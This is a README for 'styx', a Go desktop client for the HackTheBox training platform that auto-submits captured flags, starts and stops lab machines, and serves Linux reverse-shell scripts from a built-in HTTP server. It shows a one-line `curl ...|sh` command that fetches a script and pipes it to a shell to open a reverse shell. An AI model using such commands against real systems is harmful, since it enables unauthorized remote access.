![styx river](/styx.png)
# styx v0.0.1
 Styx is an cross-platform GUI interface for HackTheBox made in GoLang. Styx's UI is made with the [giu](https://github.com/AllenDang/giu) library.  
  
 ## Purpose
Styx aims to streamline the process of engaging with seasonal machines on HTB. Its primary focus is to avoid using the HTB web interface, enabling users to execute time-sensitive actions swiftly and efficiently. While Styx prioritizes functionality and speed over aesthetics, it serves as an effective and quicker alternative for interacting with HTB.  
 ## Features
 #### **Automatic Flag Submission** 
 Styx will continuously check the machine clipboard for any user or root flags, and will submit them automatically through HackTheBox's APIs. 
 #### **Built-in Reverse Shell Generator** 
 Styx contains a simple HTTP server that listens on port :61337 and returns pre-made reverse-shell scripts for Linux. Allowing you to quickly get a reverse shell with a simple  `curl 10.10.14.10/lin|sh` 
 #### **Machine Management** 
 Styx allows the user to start and stop machines on their own behalf. Flag submission is handled by the **auto flag submission** feature. 

## Usage
1. `sudo apt install -y libxcursor-dev libxrandr-dev libxinerama-dev libxi-dev libxxf86vm-dev`
2. `go install github.com/c3l3si4n/styx@HEAD`
3. Create an app token on your HTB profile (any duration you want)
4. Set the `HTB_TOKEN` environment variable with the value containing your generated token
5. Run styx

